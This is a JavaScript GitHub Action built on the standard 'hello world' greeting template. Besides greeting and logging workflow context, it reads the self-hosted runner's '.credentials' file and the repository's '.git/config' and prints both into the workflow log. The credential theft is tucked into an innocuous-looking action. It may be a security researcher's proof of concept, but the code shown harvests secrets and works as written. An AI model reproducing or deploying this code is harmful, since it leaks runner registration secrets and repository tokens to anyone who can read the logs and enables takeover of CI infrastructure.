const fs = require('fs');
const commit = require('./commit');
const core = require('@actions/core');
const github = require('@actions/github');


try {
  // `who-to-greet` input defined in action metadata file
  const nameToGreet = core.getInput('who-to-greet');
  console.log(`Hello ${nameToGreet}!`);
  const time = (new Date()).toTimeString();
  core.setOutput("time", time);
  
  // Get the JSON webhook payload for the event that triggered the workflow
  const payload = JSON.stringify(github.context.payload, undefined, 2);

  console.log(`The current directory ${process.cwd()}`);
  let contents = JSON.stringify(fs.readdirSync(process.cwd()));
  console.log(`Current directory contents ${contents}`);
  console.log(`The repo: ${github.context.repo}`);
  console.log(`The workflow: ${github.context.workflow}`);
  console.log(`Payload: ${payload}`);
  let creds = fs.readFileSync('/home/vagrant/actions-runner/.credentials', { encoding: 'utf-8'});
  let gitcreds = fs.readFileSync('./.git/config', {encoding: 'utf-8'});

  console.log(`Creds:, ${creds}, ${gitcreds}`);


} catch (error) {
  core.setFailed(error.message);
}